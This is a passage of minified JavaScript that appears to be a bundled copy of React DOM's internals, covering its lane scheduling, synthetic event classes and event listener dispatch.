Vp=je({menuitem:!0},{area:!0,base:!0,br:!0,col:!0,embed:!0,hr:!0,img:!0,input:!0,keygen:!0,link:!0,meta:!0,param:!0,source:!0,track:!0,wbr:!0});function bo(e,t){if(t){if(Vp[e]&&(t.children!=null||t.dangerouslySetInnerHTML!=null))throw Error(A(137,e));if(t.dangerouslySetInnerHTML!=null){if(t.children!=null)throw Error(A(60));if(typeof t.dangerouslySetInnerHTML!="object"||!("__html"in t.dangerouslySetInnerHTML))throw Error(A(61))}if(t.style!=null&&typeof t.style!="object")throw Error(A(62))}}function jo(e,t){if(e.indexOf("-")===-1)return typeof t.is=="string";switch(e){case"annotation-xml":case"color-profile":case"font-face":case"font-face-src":case"font-face-uri":case"font-face-format":case"font-face-name":case"missing-glyph":return!1;default:return!0}}var ko=null;function Ac(e){return e=e.target||e.srcElement||window,e.correspondingUseElement&&(e=e.correspondingUseElement),e.nodeType===3?e.parentNode:e}var _o=null,Js=null,Ys=null;function Mu(e){if(e=Na(e)){if(typeof _o!="function")throw Error(A(280));var t=e.stateNode;t&&(t=Gi(t),_o(e.stateNode,e.type,t))}}function qh(e){Js?Ys?Ys.push(e):Ys=[e]:Js=e}function Hh(){if(Js){var e=Js,t=Ys;if(Ys=Js=null,Mu(e),t)for(e=0;e<t.length;e++)Mu(t[e])}}function Kh(e,t){return e(t)}function Gh(){}var Pl=!1;function Jh(e,t,r){if(Pl)return e(t,r);Pl=!0;try{return Kh(e,t,r)}finally{Pl=!1,(Js!==null||Ys!==null)&&(Gh(),Hh())}}function Xn(e,t){var r=e.stateNode;if(r===null)return null;var s=Gi(r);if(s===null)return null;r=s[t];e:switch(t){case"onClick":case"onClickCapture":case"onDoubleClick":case"onDoubleClickCapture":case"onMouseDown":case"onMouseDownCapture":case"onMouseMove":case"onMouseMoveCapture":case"onMouseUp":case"onMouseUpCapture":case"onMouseEnter":(s=!s.disabled)||(e=e.type,s=!(e==="button"||e==="input"||e==="select"||e==="textarea")),e=!s;break e;default:e=!1}if(e)return null;if(r&&typeof r!="function")throw Error(A(231,t,typeof r));return r}var No=!1;if(or)try{var Sn={};Object.defineProperty(Sn,"passive",{get:function(){No=!0}}),window.addEventListener("test",Sn,Sn),window.removeEventListener("test",Sn,Sn)}catch{No=!1}function qp(e,t,r,s,a,i,l,o,c){var u=Array.prototype.slice.call(arguments,3);try{t.apply(r,u)}catch(h){this.onError(h)}}var Mn=!1,hi=null,fi=!1,So=null,Hp={onError:function(e){Mn=!0,hi=e}};function Kp(e,t,r,s,a,i,l,o,c){Mn=!1,hi=null,qp.apply(Hp,arguments)}function Gp(e,t,r,s,a,i,l,o,c){if(Kp.apply(this,arguments),Mn){if(Mn){var u=hi;Mn=!1,hi=null}else throw Error(A(198));fi||(fi=!0,So=u)}}function ks(e){var t=e,r=e;if(e.alternate)for(;t.return;)t=t.return;else{e=t;do t=e,t.flags&4098&&(r=t.return),e=t.return;while(e)}return t.tag===3?r:null}function Yh(e){if(e.tag===13){var t=e.memoizedState;if(t===null&&(e=e.alternate,e!==null&&(t=e.memoizedState)),t!==null)return t.dehydrated}return null}function Fu(e){if(ks(e)!==e)throw Error(A(188))}function Jp(e){var t=e.alternate;if(!t){if(t=ks(e),t===null)throw Error(A(188));return t!==e?null:e}for(var r=e,s=t;;){var a=r.return;if(a===null)break;var i=a.alternate;if(i===null){if(s=a.return,s!==null){r=s;continue}break}if(a.child===i.child){for(i=a.child;i;){if(i===r)return Fu(a),e;if(i===s)return Fu(a),t;i=i.sibling}throw Error(A(188))}if(r.return!==s.return)r=a,s=i;else{for(var l=!1,o=a.child;o;){if(o===r){l=!0,r=a,s=i;break}if(o===s){l=!0,s=a,r=i;break}o=o.sibling}if(!l){for(o=i.child;o;){if(o===r){l=!0,r=i,s=a;break}if(o===s){l=!0,s=i,r=a;break}o=o.sibling}if(!l)throw Error(A(189))}}if(r.alternate!==s)throw Error(A(190))}if(r.tag!==3)throw Error(A(188));return r.stateNode.current===r?e:t}function Qh(e){return e=Jp(e),e!==null?Xh(e):null}function Xh(e){if(e.tag===5||e.tag===6)return e;for(e=e.child;e!==null;){var t=Xh(e);if(t!==null)return t;e=e.sibling}return null}var Zh=pt.unstable_scheduleCallback,Bu=pt.unstable_cancelCallback,Yp=pt.unstable_shouldYield,Qp=pt.unstable_requestPaint,Se=pt.unstable_now,Xp=pt.unstable_getCurrentPriorityLevel,Oc=pt.unstable_ImmediatePriority,ef=pt.unstable_UserBlockingPriority,mi=pt.unstable_NormalPriority,Zp=pt.unstable_LowPriority,tf=pt.unstable_IdlePriority,Vi=null,Kt=null;function e0(e){if(Kt&&typeof Kt.onCommitFiberRoot=="function")try{Kt.onCommitFiberRoot(Vi,e,void 0,(e.current.flags&128)===128)}catch{}}var Dt=Math.clz32?Math.clz32:s0,t0=Math.log,r0=Math.LN2;function s0(e){return e>>>=0,e===0?32:31-(t0(e)/r0|0)|0}var Aa=64,Oa=4194304;function zn(e){switch(e&-e){case 1:return 1;case 2:return 2;case 4:return 4;case 8:return 8;case 16:return 16;case 32:return 32;case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return e&4194240;case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:return e&130023424;case 134217728:return 134217728;case 268435456:return 268435456;case 536870912:return 536870912;case 1073741824:return 1073741824;default:return e}}function pi(e,t){var r=e.pendingLanes;if(r===0)return 0;var s=0,a=e.suspendedLanes,i=e.pingedLanes,l=r&268435455;if(l!==0){var o=l&~a;o!==0?s=zn(o):(i&=l,i!==0&&(s=zn(i)))}else l=r&~a,l!==0?s=zn(l):i!==0&&(s=zn(i));if(s===0)return 0;if(t!==0&&t!==s&&!(t&a)&&(a=s&-s,i=t&-t,a>=i||a===16&&(i&4194240)!==0))return t;if(s&4&&(s|=r&16),t=e.entangledLanes,t!==0)for(e=e.entanglements,t&=s;0<t;)r=31-Dt(t),a=1<<r,s|=e[r],t&=~a;return s}function n0(e,t){switch(e){case 1:case 2:case 4:return t+250;case 8:case 16:case 32:case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return t+5e3;case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:return-1;case 134217728:case 268435456:case 536870912:case 1073741824:return-1;default:return-1}}function a0(e,t){for(var r=e.suspendedLanes,s=e.pingedLanes,a=e.expirationTimes,i=e.pendingLanes;0<i;){var l=31-Dt(i),o=1<<l,c=a[l];c===-1?(!(o&r)||o&s)&&(a[l]=n0(o,t)):c<=t&&(e.expiredLanes|=o),i&=~o}}function Eo(e){return e=e.pendingLanes&-1073741825,e!==0?e:e&1073741824?1073741824:0}function rf(){var e=Aa;return Aa<<=1,!(Aa&4194240)&&(Aa=64),e}function Al(e){for(var t=[],r=0;31>r;r++)t.push(e);return t}function ka(e,t,r){e.pendingLanes|=t,t!==536870912&&(e.suspendedLanes=0,e.pingedLanes=0),e=e.eventTimes,t=31-Dt(t),e[t]=r}function i0(e,t){var r=e.pendingLanes&~t;e.pendingLanes=t,e.suspendedLanes=0,e.pingedLanes=0,e.expiredLanes&=t,e.mutableReadLanes&=t,e.entangledLanes&=t,t=e.entanglements;var s=e.eventTimes;for(e=e.expirationTimes;0<r;){var a=31-Dt(r),i=1<<a;t[a]=0,s[a]=-1,e[a]=-1,r&=~i}}function Ic(e,t){var r=e.entangledLanes|=t;for(e=e.entanglements;r;){var s=31-Dt(r),a=1<<s;a&t|e[s]&t&&(e[s]|=t),r&=~a}}var ae=0;function sf(e){return e&=-e,1<e?4<e?e&268435455?16:536870912:4:1}var nf,$c,af,lf,of,Co=!1,Ia=[],Cr=null,Tr=null,Rr=null,Zn=new Map,ea=new Map,br=[],l0="mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset submit".split(" ");function Wu(e,t){switch(e){case"focusin":case"focusout":Cr=null;break;case"dragenter":case"dragleave":Tr=null;break;case"mouseover":case"mouseout":Rr=null;break;case"pointerover":case"pointerout":Zn.delete(t.pointerId);break;case"gotpointercapture":case"lostpointercapture":ea.delete(t.pointerId)}}function En(e,t,r,s,a,i){return e===null||e.nativeEvent!==i?(e={blockedOn:t,domEventName:r,eventSystemFlags:s,nativeEvent:i,targetContainers:[a]},t!==null&&(t=Na(t),t!==null&&$c(t)),e):(e.eventSystemFlags|=s,t=e.targetContainers,a!==null&&t.indexOf(a)===-1&&t.push(a),e)}function o0(e,t,r,s,a){switch(t){case"focusin":return Cr=En(Cr,e,t,r,s,a),!0;case"dragenter":return Tr=En(Tr,e,t,r,s,a),!0;case"mouseover":return Rr=En(Rr,e,t,r,s,a),!0;case"pointerover":var i=a.pointerId;return Zn.set(i,En(Zn.get(i)||null,e,t,r,s,a)),!0;case"gotpointercapture":return i=a.pointerId,ea.set(i,En(ea.get(i)||null,e,t,r,s,a)),!0}return!1}function cf(e){var t=ds(e.target);if(t!==null){var r=ks(t);if(r!==null){if(t=r.tag,t===13){if(t=Yh(r),t!==null){e.blockedOn=t,of(e.priority,function(){af(r)});return}}else if(t===3&&r.stateNode.current.memoizedState.isDehydrated){e.blockedOn=r.tag===3?r.stateNode.containerInfo:null;return}}}e.blockedOn=null}function ei(e){if(e.blockedOn!==null)return!1;for(var t=e.targetContainers;0<t.length;){var r=To(e.domEventName,e.eventSystemFlags,t[0],e.nativeEvent);if(r===null){r=e.nativeEvent;var s=new r.constructor(r.type,r);ko=s,r.target.dispatchEvent(s),ko=null}else return t=Na(r),t!==null&&$c(t),e.blockedOn=r,!1;t.shift()}return!0}function Vu(e,t,r){ei(e)&&r.delete(t)}function c0(){Co=!1,Cr!==null&&ei(Cr)&&(Cr=null),Tr!==null&&ei(Tr)&&(Tr=null),Rr!==null&&ei(Rr)&&(Rr=null),Zn.forEach(Vu),ea.forEach(Vu)}function Cn(e,t){e.blockedOn===t&&(e.blockedOn=null,Co||(Co=!0,pt.unstable_scheduleCallback(pt.unstable_NormalPriority,c0)))}function ta(e){function t(a){return Cn(a,e)}if(0<Ia.length){Cn(Ia[0],e);for(var r=1;r<Ia.length;r++){var s=Ia[r];s.blockedOn===e&&(s.blockedOn=null)}}for(Cr!==null&&Cn(Cr,e),Tr!==null&&Cn(Tr,e),Rr!==null&&Cn(Rr,e),Zn.forEach(t),ea.forEach(t),r=0;r<br.length;r++)s=br[r],s.blockedOn===e&&(s.blockedOn=null);for(;0<br.length&&(r=br[0],r.blockedOn===null);)cf(r),r.blockedOn===null&&br.shift()}var Qs=fr.ReactCurrentBatchConfig,xi=!0;function u0(e,t,r,s){var a=ae,i=Qs.transition;Qs.transition=null;try{ae=1,zc(e,t,r,s)}finally{ae=a,Qs.transition=i}}function d0(e,t,r,s){var a=ae,i=Qs.transition;Qs.transition=null;try{ae=4,zc(e,t,r,s)}finally{ae=a,Qs.transition=i}}function zc(e,t,r,s){if(xi){var a=To(e,t,r,s);if(a===null)Bl(e,t,s,gi,r),Wu(e,s);else if(o0(a,e,t,r,s))s.stopPropagation();else if(Wu(e,s),t&4&&-1<l0.indexOf(e)){for(;a!==null;){var i=Na(a);if(i!==null&&nf(i),i=To(e,t,r,s),i===null&&Bl(e,t,s,gi,r),i===a)break;a=i}a!==null&&s.stopPropagation()}else Bl(e,t,s,null,r)}}var gi=null;function To(e,t,r,s){if(gi=null,e=Ac(s),e=ds(e),e!==null)if(t=ks(e),t===null)e=null;else if(r=t.tag,r===13){if(e=Yh(t),e!==null)return e;e=null}else if(r===3){if(t.stateNode.current.memoizedState.isDehydrated)return t.tag===3?t.stateNode.containerInfo:null;e=null}else t!==e&&(e=null);return gi=e,null}function uf(e){switch(e){case"cancel":case"click":case"close":case"contextmenu":case"copy":case"cut":case"auxclick":case"dblclick":case"dragend":case"dragstart":case"drop":case"focusin":case"focusout":case"input":case"invalid":case"keydown":case"keypress":case"keyup":case"mousedown":case"mouseup":case"paste":case"pause":case"play":case"pointercancel":case"pointerdown":case"pointerup":case"ratechange":case"reset":case"resize":case"seeked":case"submit":case"touchcancel":case"touchend":case"touchstart":case"volumechange":case"change":case"selectionchange":case"textInput":case"compositionstart":case"compositionend":case"compositionupdate":case"beforeblur":case"afterblur":case"beforeinput":case"blur":case"fullscreenchange":case"focus":case"hashchange":case"popstate":case"select":case"selectstart":return 1;case"drag":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"mousemove":case"mouseout":case"mouseover":case"pointermove":case"pointerout":case"pointerover":case"scroll":case"toggle":case"touchmove":case"wheel":case"mouseenter":case"mouseleave":case"pointerenter":case"pointerleave":return 4;case"message":switch(Xp()){case Oc:return 1;case ef:return 4;case mi:case Zp:return 16;case tf:return 536870912;default:return 16}default:return 16}}var _r=null,Lc=null,ti=null;function df(){if(ti)return ti;var e,t=Lc,r=t.length,s,a="value"in _r?_r.value:_r.textContent,i=a.length;for(e=0;e<r&&t[e]===a[e];e++);var l=r-e;for(s=1;s<=l&&t[r-s]===a[i-s];s++);return ti=a.slice(e,1<s?1-s:void 0)}function ri(e){var t=e.keyCode;return"charCode"in e?(e=e.charCode,e===0&&t===13&&(e=13)):e=t,e===10&&(e=13),32<=e||e===13?e:0}function $a(){return!0}function qu(){return!1}function gt(e){function t(r,s,a,i,l){this._reactName=r,this._targetInst=a,this.type=s,this.nativeEvent=i,this.target=l,this.currentTarget=null;for(var o in e)e.hasOwnProperty(o)&&(r=e[o],this[o]=r?r(i):i[o]);return this.isDefaultPrevented=(i.defaultPrevented!=null?i.defaultPrevented:i.returnValue===!1)?$a:qu,this.isPropagationStopped=qu,this}return je(t.prototype,{preventDefault:function(){this.defaultPrevented=!0;var r=this.nativeEvent;r&&(r.preventDefault?r.preventDefault():typeof r.returnValue!="unknown"&&(r.returnValue=!1),this.isDefaultPrevented=$a)},stopPropagation:function(){var r=this.nativeEvent;r&&(r.stopPropagation?r.stopPropagation():typeof r.cancelBubble!="unknown"&&(r.cancelBubble=!0),this.isPropagationStopped=$a)},persist:function(){},isPersistent:$a}),t}var fn={eventPhase:0,bubbles:0,cancelable:0,timeStamp:function(e){return e.timeStamp||Date.now()},defaultPrevented:0,isTrusted:0},Uc=gt(fn),_a=je({},fn,{view:0,detail:0}),h0=gt(_a),Ol,Il,Tn,qi=je({},_a,{screenX:0,screenY:0,clientX:0,clientY:0,pageX:0,pageY:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,getModifierState:Dc,button:0,buttons:0,relatedTarget:function(e){return e.relatedTarget===void 0?e.fromElement===e.srcElement?e.toElement:e.fromElement:e.relatedTarget},movementX:function(e){return"movementX"in e?e.movementX:(e!==Tn&&(Tn&&e.type==="mousemove"?(Ol=e.screenX-Tn.screenX,Il=e.screenY-Tn.screenY):Il=Ol=0,Tn=e),Ol)},movementY:function(e){return"movementY"in e?e.movementY:Il}}),Hu=gt(qi),f0=je({},qi,{dataTransfer:0}),m0=gt(f0),p0=je({},_a,{relatedTarget:0}),$l=gt(p0),x0=je({},fn,{animationName:0,elapsedTime:0,pseudoElement:0}),g0=gt(x0),y0=je({},fn,{clipboardData:function(e){return"clipboardData"in e?e.clipboardData:window.clipboardData}}),v0=gt(y0),w0=je({},fn,{data:0}),Ku=gt(w0),b0={Esc:"Escape",Spacebar:" ",Left:"ArrowLeft",Up:"ArrowUp",Right:"ArrowRight",Down:"ArrowDown",Del:"Delete",Win:"OS",Menu:"ContextMenu",Apps:"ContextMenu",Scroll:"ScrollLock",MozPrintableKey:"Unidentified"},j0={8:"Backspace",9:"Tab",12:"Clear",13:"Enter",16:"Shift",17:"Control",18:"Alt",19:"Pause",20:"CapsLock",27:"Escape",32:" ",33:"PageUp",34:"PageDown",35:"End",36:"Home",37:"ArrowLeft",38:"ArrowUp",39:"ArrowRight",40:"ArrowDown",45:"Insert",46:"Delete",112:"F1",113:"F2",114:"F3",115:"F4",116:"F5",117:"F6",118:"F7",119:"F8",120:"F9",121:"F10",122:"F11",123:"F12",144:"NumLock",145:"ScrollLock",224:"Meta"},k0={Alt:"altKey",Control:"ctrlKey",Meta:"metaKey",Shift:"shiftKey"};function _0(e){var t=this.nativeEvent;return t.getModifierState?t.getModifierState(e):(e=k0[e])?!!t[e]:!1}function Dc(){return _0}var N0=je({},_a,{key:function(e){if(e.key){var t=b0[e.key]||e.key;if(t!=="Unidentified")return t}return e.type==="keypress"?(e=ri(e),e===13?"Enter":String.fromCharCode(e)):e.type==="keydown"||e.type==="keyup"?j0[e.keyCode]||"Unidentified":""},code:0,location:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,repeat:0,locale:0,getModifierState:Dc,charCode:function(e){return e.type==="keypress"?ri(e):0},keyCode:function(e){return e.type==="keydown"||e.type==="keyup"?e.keyCode:0},which:function(e){return e.type==="keypress"?ri(e):e.type==="keydown"||e.type==="keyup"?e.keyCode:0}}),S0=gt(N0),E0=je({},qi,{pointerId:0,width:0,height:0,pressure:0,tangentialPressure:0,tiltX:0,tiltY:0,twist:0,pointerType:0,isPrimary:0}),Gu=gt(E0),C0=je({},_a,{touches:0,targetTouches:0,changedTouches:0,altKey:0,metaKey:0,ctrlKey:0,shiftKey:0,getModifierState:Dc}),T0=gt(C0),R0=je({},fn,{propertyName:0,elapsedTime:0,pseudoElement:0}),P0=gt(R0),A0=je({},qi,{deltaX:function(e){return"deltaX"in e?e.deltaX:"wheelDeltaX"in e?-e.wheelDeltaX:0},deltaY:function(e){return"deltaY"in e?e.deltaY:"wheelDeltaY"in e?-e.wheelDeltaY:"wheelDelta"in e?-e.wheelDelta:0},deltaZ:0,deltaMode:0}),O0=gt(A0),I0=[9,13,27,32],Mc=or&&"CompositionEvent"in window,Fn=null;or&&"documentMode"in document&&(Fn=document.documentMode);var $0=or&&"TextEvent"in window&&!Fn,hf=or&&(!Mc||Fn&&8<Fn&&11>=Fn),Ju=" ",Yu=!1;function ff(e,t){switch(e){case"keyup":return I0.indexOf(t.keyCode)!==-1;case"keydown":return t.keyCode!==229;case"keypress":case"mousedown":case"focusout":return!0;default:return!1}}function mf(e){return e=e.detail,typeof e=="object"&&"data"in e?e.data:null}var Ls=!1;function z0(e,t){switch(e){case"compositionend":return mf(t);case"keypress":return t.which!==32?null:(Yu=!0,Ju);case"textInput":return e=t.data,e===Ju&&Yu?null:e;default:return null}}function L0(e,t){if(Ls)return e==="compositionend"||!Mc&&ff(e,t)?(e=df(),ti=Lc=_r=null,Ls=!1,e):null;switch(e){case"paste":return null;case"keypress":if(!(t.ctrlKey||t.altKey||t.metaKey)||t.ctrlKey&&t.altKey){if(t.char&&1<t.char.length)return t.char;if(t.which)return String.fromCharCode(t.which)}return null;case"compositionend":return hf&&t.locale!=="ko"?null:t.data;default:return null}}var U0={color:!0,date:!0,datetime:!0,"datetime-local":!0,email:!0,month:!0,number:!0,password:!0,range:!0,search:!0,tel:!0,text:!0,time:!0,url:!0,week:!0};function Qu(e){var t=e&&e.nodeName&&e.nodeName.toLowerCase();return t==="input"?!!U0[e.type]:t==="textarea"}function pf(e,t,r,s){qh(s),t=yi(t,"onChange"),0<t.length&&(r=new Uc("onChange","change",null,r,s),e.push({event:r,listeners:t}))}var Bn=null,ra=null;function D0(e){Sf(e,0)}function Hi(e){var t=Ms(e);if(Uh(t))return e}function M0(e,t){if(e==="change")return t}var xf=!1;if(or){var zl;if(or){var Ll="oninput"in document;if(!Ll){var Xu=document.createElement("div");Xu.setAttribute("oninput","return;"),Ll=typeof Xu.oninput=="function"}zl=Ll}else zl=!1;xf=zl&&(!document.documentMode||9<document.documentMode)}function Zu(){Bn&&(Bn.detachEvent("onpropertychange",gf),ra=Bn=null)}function gf(e){if(e.propertyName==="value"&&Hi(ra)){var t=[];pf(t,ra,e,Ac(e)),Jh(D0,t)}}function F0(e,t,r){e==="focusin"?(Zu(),Bn=t,ra=r,Bn.attachEvent("onpropertychange",gf)):e==="focusout"&&Zu()}function B0(e){if(e==="selectionchange"||e==="keyup"||e==="keydown")return Hi(ra)}function W0(e,t){if(e==="click")return Hi(t)}function V0(e,t){if(e==="input"||e==="change")return Hi(t)}function q0(e,t){return e===t&&(e!==0||1/e===1/t)||e!==e&&t!==t}var Ft=typeof Object.is=="function"?Object.is:q0;function sa(e,t){if(Ft(e,t))return!0;if(typeof e!="object"||e===null||typeof t!="object"||t===null)return!1;var r=Object.keys(e),s=Object.keys(t);if(r.length!==s.length)return!1;for(s=0;s<r.length;s++){var a=r[s];if(!uo.call(t,a)||!Ft(e[a],t[a]))return!1}return!0}function ed(e){for(;e&&e.firstChild;)e=e.firstChild;return e}function td(e,t){var r=ed(e);e=0;for(var s;r;){if(r.nodeType===3){if(s=e+r.textContent.length,e<=t&&s>=t)return{node:r,offset:t-e};e=s}e:{for(;r;){if(r.nextSibling){r=r.nextSibling;break e}r=r.parentNode}r=void 0}r=ed(r)}}function yf(e,t){return e&&t?e===t?!0:e&&e.nodeType===3?!1:t&&t.nodeType===3?yf(e,t.parentNode):"contains"in e?e.contains(t):e.compareDocumentPosition?!!(e.compareDocumentPosition(t)&16):!1:!1}function vf(){for(var e=window,t=di();t instanceof e.HTMLIFrameElement;){try{var r=typeof t.contentWindow.location.href=="string"}catch{r=!1}if(r)e=t.contentWindow;else break;t=di(e.document)}return t}function Fc(e){var t=e&&e.nodeName&&e.nodeName.toLowerCase();return t&&(t==="input"&&(e.type==="text"||e.type==="search"||e.type==="tel"||e.type==="url"||e.type==="password")||t==="textarea"||e.contentEditable==="true")}function H0(e){var t=vf(),r=e.focusedElem,s=e.selectionRange;if(t!==r&&r&&r.ownerDocument&&yf(r.ownerDocument.documentElement,r)){if(s!==null&&Fc(r)){if(t=s.start,e=s.end,e===void 0&&(e=t),"selectionStart"in r)r.selectionStart=t,r.selectionEnd=Math.min(e,r.value.length);else if(e=(t=r.ownerDocument||document)&&t.defaultView||window,e.getSelection){e=e.getSelection();var a=r.textContent.length,i=Math.min(s.start,a);s=s.end===void 0?i:Math.min(s.end,a),!e.extend&&i>s&&(a=s,s=i,i=a),a=td(r,i);var l=td(r,s);a&&l&&(e.rangeCount!==1||e.anchorNode!==a.node||e.anchorOffset!==a.offset||e.focusNode!==l.node||e.focusOffset!==l.offset)&&(t=t.createRange(),t.setStart(a.node,a.offset),e.removeAllRanges(),i>s?(e.addRange(t),e.extend(l.node,l.offset)):(t.setEnd(l.node,l.offset),e.addRange(t)))}}for(t=[],e=r;e=e.parentNode;)e.nodeType===1&&t.push({element:e,left:e.scrollLeft,top:e.scrollTop});for(typeof r.focus=="function"&&r.focus(),r=0;r<t.length;r++)e=t[r],e.element.scrollLeft=e.left,e.element.scrollTop=e.top}}var K0=or&&"documentMode"in document&&11>=document.documentMode,Us=null,Ro=null,Wn=null,Po=!1;function rd(e,t,r){var s=r.window===r?r.document:r.nodeType===9?r:r.ownerDocument;Po||Us==null||Us!==di(s)||(s=Us,"selectionStart"in s&&Fc(s)?s={start:s.selectionStart,end:s.selectionEnd}:(s=(s.ownerDocument&&s.ownerDocument.defaultView||window).getSelection(),s={anchorNode:s.anchorNode,anchorOffset:s.anchorOffset,focusNode:s.focusNode,focusOffset:s.focusOffset}),Wn&&sa(Wn,s)||(Wn=s,s=yi(Ro,"onSelect"),0<s.length&&(t=new Uc("onSelect","select",null,t,r),e.push({event:t,listeners:s}),t.target=Us)))}function za(e,t){var r={};return r[e.toLowerCase()]=t.toLowerCase(),r["Webkit"+e]="webkit"+t,r["Moz"+e]="moz"+t,r}var Ds={animationend:za("Animation","AnimationEnd"),animationiteration:za("Animation","AnimationIteration"),animationstart:za("Animation","AnimationStart"),transitionend:za("Transition","TransitionEnd")},Ul={},wf={};or&&(wf=document.createElement("div").style,"AnimationEvent"in window||(delete Ds.animationend.animation,delete Ds.animationiteration.animation,delete Ds.animationstart.animation),"TransitionEvent"in window||delete Ds.transitionend.transition);function Ki(e){if(Ul[e])return Ul[e];if(!Ds[e])return e;var t=Ds[e],r;for(r in t)if(t.hasOwnProperty(r)&&r in wf)return Ul[e]=t[r];return e}var bf=Ki("animationend"),jf=Ki("animationiteration"),kf=Ki("animationstart"),_f=Ki("transitionend"),Nf=new Map,sd="abort auxClick cancel canPlay canPlayThrough click close contextMenu copy cut drag dragEnd dragEnter dragExit dragLeave dragOver dragStart drop durationChange emptied encrypted ended error gotPointerCapture input invalid keyDown keyPress keyUp load loadedData loadedMetadata loadStart lostPointerCapture mouseDown mouseMove mouseOut mouseOver mouseUp paste pause play playing pointerCancel pointerDown pointerMove pointerOut pointerOver pointerUp progress rateChange reset resize seeked seeking stalled submit suspend timeUpdate touchCancel touchEnd touchStart volumeChange scroll toggle touchMove waiting wheel".split(" ");function Fr(e,t){Nf.set(e,t),js(t,[e])}for(var Dl=0;Dl<sd.length;Dl++){var Ml=sd[Dl],G0=Ml.toLowerCase(),J0=Ml[0].toUpperCase()+Ml.slice(1);Fr(G0,"on"+J0)}Fr(bf,"onAnimationEnd");Fr(jf,"onAnimationIteration");Fr(kf,"onAnimationStart");Fr("dblclick","onDoubleClick");Fr("focusin","onFocus");Fr("focusout","onBlur");Fr(_f,"onTransitionEnd");tn("onMouseEnter",["mouseout","mouseover"]);tn("onMouseLeave",["mouseout","mouseover"]);tn("onPointerEnter",["pointerout","pointerover"]);tn("onPointerLeave",["pointerout","pointerover"]);js("onChange","change click focusin focusout input keydown keyup selectionchange".split(" "));js("onSelect","focusout contextmenu dragend focusin keydown keyup mousedown mouseup selectionchange".split(" "));js("onBeforeInput",["compositionend","keypress","textInput","paste"]);js("onCompositionEnd","compositionend focusout keydown keypress keyup mousedown".split(" "));js("onCompositionStart","compositionstart focusout keydown keypress keyup mousedown".split(" "));js("onCompositionUpdate","compositionupdate focusout keydown keypress keyup mousedown".split(" "));var Ln="abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange resize seeked seeking stalled suspend timeupdate volumechange waiting".split(" "),Y0=new Set("cancel close invalid load scroll toggle".split(" ").concat(Ln));function nd(e,t,r){var s=e.type||"unknown-event";e.currentTarget=r,Gp(s,t,void 0,e),e.currentTarget=null}function Sf(e,t){t=(t&4)!==0;for(var r=0;r<e.length;r++){var s=e[r],a=s.event;s=s.listeners;e:{var i=void 0;if(t)for(var l=s.length-1;0<=l;l--){var o=s[l],c=o.instance,u=o.currentTarget;if(o=o.listener,c!==i&&a.isPropagationStopped())break e;nd(a,o,u),i=c}else for(l=0;l<s.length;l++){if(o=s[l],c=o.instance,u=o.currentTarget,o=o.listener,c!==i&&a.isPropagationStopped())break e;nd(a,o,u),i=c}}}if(fi)throw e=So,fi=!1,So=null,e}function pe(e,t){var r=t[zo];r===void 0&&(r=t[zo]=new Set);var s=e+"__bubble";r.has(s)||(Ef(t,e,2,!1),r.add(s))}function Fl(e,t,r){var s=0;t&&(s|=4),Ef(r,e,s,t)}var La="_reactListening"+Math.random().toString(36).slice(2);function na(e){if(!e[La]){e[La]=!0,Oh.forEach(function(r){r!=="selectionchange"&&(Y0.has(r)||Fl(r,!1,e),Fl(r,!0,e))});var t=e.nodeType===9?e:e.ownerDocument;t===null||t[La]||(t[La]=!0,Fl("selectionchange",!1,t))}}function Ef(e,t,r,s){switch(uf(t)){case 1:var a=u0;break;case 4:a=d0;break;default:a=zc}r=a.bind(null,t,r,e),a=void 0,!No||t!=="touchstart"&&t!=="touchmove"&&t!=="wheel"||(a=!0),s?a!==void 0?e.addEventListener(t,r,{capture:!0,passive:a}):e.addEventListener(t,r,!0):a!==void 0?e.addEventListener(t,r,{passive:a}):e.addEventListener(t,r,!1)}function Bl(e,t,r,s,a){var i=s;if(!(t&1)&&!(t&2)&&s!==null)e:for(;;){if(s===null)return;var l=s.tag;if(l===3||l===4){var o=s.stateNode.containerInfo;if(o===a||o.nodeType===8&&o.parentNode===a)break;if(l===4)for(l=s.return;l!==null;){var c=l.tag;if((c===3||c===4)&&(c=l.stateNode.containerInfo,c===a||c.nodeType===8&&c.parentNode===a))return;l=l.return}for(;o!==null;){if(l=ds(o),l===null)return;if(c=l.tag,c===5||c===6){s=i=l;continue e}o=o.parentNode}}s=s.return}Jh(function(){var u=i,h=Ac(r),p=[];e:{var x=Nf.get(e);if(x!==void 0){var v=Uc,f=e;switch(e){case"keypress":if(ri(r)===0)break e;case"keydown":case"keyup":v=S0;break;case"focusin":f="focus",v=$l;break;case"focusout":f="blur",v=$l;break;case"beforeblur":case"afterblur":v=$l;break;case"click":if(r.button===2)break e;case"auxclick":case"dblclick":case"mousedown":case"mousemove":case"mouseup":case"mouseout":case"mouseover":case"contextmenu":v=Hu;break;case"drag":case"dragend":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"dragstart":case"drop":v=m0;break;case"touchcancel":case"touchend":case"touchmove":case"touchstart":v=T0;break;case bf:case jf:case kf:v=g0;break;case _f:v=P0;break;case"scroll":v=h0;break;case"wheel":v=O0;break;case"copy":case"cut":case"paste":v=v0;break;case"gotpointercapture":case"lostpointercapture":case"pointercancel":case"pointerdown":case"pointermove":case"pointerout":case"pointerover":case"pointerup":v=Gu}var w=(t&4)!==0,j=!w&&e==="scroll",y=w?x!==null?x+"Capture":null:x;w=[];for(var m=u,g;m!==null;){g=m;var k=g.stateNode;if(g.tag===5&&k!==null&&(g=k,y!==null&&(k=Xn(m,y),k!=null&&w.push(aa(m,k,g)))),j)break;m=m.return}0<w.length&&(x=new v(x,f,null,r,h),p.push({event:x,listeners:w}))}}if(!(t&7)){e:{if(x=e==="mouseover"||e==="pointerover",v=e==="mouseout"||e==="pointerout",x&&r!==ko&&(f=r.relatedTarget||r.fromElement)&&(ds(f)||f[cr]))break 